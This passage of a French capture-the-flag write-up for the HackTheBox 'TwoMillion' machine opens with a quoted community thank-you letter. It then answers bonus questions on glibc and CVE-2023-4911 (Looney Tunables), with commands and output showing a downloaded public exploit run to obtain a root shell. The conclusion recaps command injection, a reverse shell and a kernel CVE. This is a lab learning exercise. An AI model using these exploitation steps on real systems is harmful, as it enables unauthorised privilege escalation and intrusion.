Chère communauté HackTheBox,

Nous sommes ravis d'annoncer une étape importante dans notre aventure commune. C'est avec une immense joie et une immense gratitude que nous célébrons le franchissement de la barre des 2 millions d'utilisateurs exceptionnels ! Cet exploit incroyable n'aurait pas été possible sans chacun d'entre vous.

Depuis sa création, HackTheBox s'est construit sur la conviction que le partage des connaissances, la collaboration et l'expérience pratique sont essentiels à l'épanouissement personnel et professionnel. Ensemble, nous avons créé un environnement propice à l'innovation et au perfectionnement des compétences. Chaque défi relevé, chaque machine maîtrisée et chaque compétence acquise ont contribué à l'intelligence collective qui alimente cette communauté dynamique.

À chaque membre de la communauté HackTheBox, merci de participer à cette incroyable aventure. Vos contributions ont façonné la structure même de notre plateforme et nous ont inspirés à innover et à évoluer sans cesse. Nous sommes extrêmement fiers de ce que nous avons accompli ensemble et nous attendons avec impatience les nombreuses étapes à venir.

Entrons dans le prochain chapitre, où nous continuerons à repousser les limites de la cybersécurité, à inspirer la prochaine génération de hackers éthiques et à créer un monde où la connaissance est accessible à tous.

Avec toute notre gratitude,

L'équipe HackTheBox
```

## Bonus - Escalade de privilèges alternative

Le challenge est terminé. Néanmoins, il reste tout de même 3 questions bonus qui se concentre sur une escalade de privilèges alternative. Cette section a pour but de répondre aux dernières questions bonus.

### Q14 - Version de GLIBC

**Rappel :** *Quelle est la version de la bibliothèque GLIBC sur TwoMillion ?*

En cherchant sur Internet j’ai trouvé les commandes suivantes qui permettent de récupérer la version de la libc sous Linux.

```bash
(remote) www-data@2million:/var/www/html$ find / -type f -name libc.so 2>/dev/null 
/usr/lib/x86_64-linux-gnu/libc.so
(remote) www-data@2million:/var/www/html$ /usr/lib/x86_64-linux-gnu/libc.so
bash: /usr/lib/x86_64-linux-gnu/libc.so: Permission denied
# La première n'a pas fonctionné par manque de permissions

# Celle-ci fonctionne en revanche
(remote) www-data@2million:/var/www/html$ dpkg -l libc6
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name           Version         Architecture Description
+++-==============-===============-============-=================================
ii  libc6:amd64    2.35-0ubuntu3.1 amd64        GNU C Library: Shared libraries
```

**Réponse :** `2.35`

### Q15 - ID CVE

**Rappel :** *Quel est l'ID CVE de la vulnérabilité de buffer overflow de 2023 dans le chargeur dynamique GNU C ?*

Bien, maintenant que nous avons la version de la libc nous devons chercher s’il existe des vulnérabilités sur cette version plus précisément s’il existe des **buffer overflow** publiés en 2023.

En effectuant quelques recherches je suis tombé sur les deux liens suivants :

- https://www.rapid7.com/db/modules/exploit/linux/local/glibc_tunables_priv_esc/
- https://nvd.nist.gov/vuln/detail/cve-2023-4911

Il existe apparemment une certaine `CVE-2023-4911` (aussi appelée Looney Tunables) qui correspond à la vulnérabilité recherchée.

**Réponse :**  `CVE-2023-4911`

### Q16 - Variable d’environnement

**Rappel :** *Avec un shell en tant qu'admin ou www-data, recherchez un POC pour Looney Tunables. Quel est le nom de la variable d'environnement qui déclenche le buffer overflow ? Après avoir répondu à cette question, exécutez le POC et obtenez un shell en tant que root.*

D’après les liens ci-dessus on peut répondre à la question :

**Réponse :**  `GLIBC_TUNABLES`

### Exploitation de la CVE-2023-4911

J’ai réussi à trouver un exploit Python appartenant à un utilisateur Twitter nommé `bl4sty` via le lien suivant : https://haxx.in/files/gnu-acme.py

Copions-le dans un fichier sous `/tmp` 

```bash
(remote) www-data@2million:/var/www/html$ cd /tmp
(remote) www-data@2million:/var/www/html$ vim gnu-acme.py
```

Maintenant que nous avons notre exploit nous pouvons l’exécuter.

```bash
(remote) www-data@2million:/tmp$ python3 gnu-acme.py 

      $$$ glibc ld.so (CVE-2023-4911) exploit $$$
            -- by blasty <peter@haxx.in> --      

[i] libc = /lib/x86_64-linux-gnu/libc.so.6
[i] suid target = /bin/su, suid_args = ['--help']
[i] ld.so = /lib64/ld-linux-x86-64.so.2
[i] ld.so build id = 61ef896a699bb1c2e4e231642b2e1688b2f1a61e
[i] __libc_start_main = 0x29dc0
[i] using hax path b'"' at offset -20
[i] wrote patched libc.so.6
[i] using stack addr 0x7ffe10101008
...............................................................................................................# ** ohh... looks like we got a shell? **

id
uid=0(root) gid=33(www-data) groups=33(www-data)
# whoami
root
```

Parfait ! Nous avons réussi à exploiter la `CVE-2023-4911` et ainsi pu obtenir un shell `root`.

## Conclusion

Cette box portait sur l’exploitation d’un serveur web sous Nginx. Nous avons dans un premier temps énuméré le serveur web (ports, fichiers Javascript, etc…). Puis, réussi à exploiter une API REST via un manque de vérification des permissions utilisateurs mais aussi et surtout via un endpoint vulnérable à l’injection de commandes. Après avoir obtenu un reverse shell sur la machine cible, nous avons découvert des identifiants de connexion à une base de donnée qui nous ont permis de nous connecter à un compte utilisateur. Pour terminer, nous avons réussi à exploiter une vulnérabilité kernel correspondant à la `CVE-2023-0386` nous donnant un accès en tant que `root`.

À travers cette box, j'ai appris plusieurs notions :

- L’énumération d’une API REST
- L’exploitation d’une API REST via une injection de commande
- Comment un simple fichier créé par un serveur web peut être un vecteur d’attaque
- L’importance de ne pas réutiliser son mot de passe
- La dangerosité des vulnérabilités kernel et bibliothèques

Cette box m’a permis de renforcer mes compétences en sécurité web (API).

## Remerciements

Si vous êtes arrivé jusqu'ici — merci ! Le partage des connaissances est ce qui rend la communauté CTF vraiment géniale. J'espère que ce write-up vous a été utile ou au moins intéressant. 

Et souvenez-vous :

*Every vulnerability is a lesson in disguise—the more we break, the more we understand how to build.*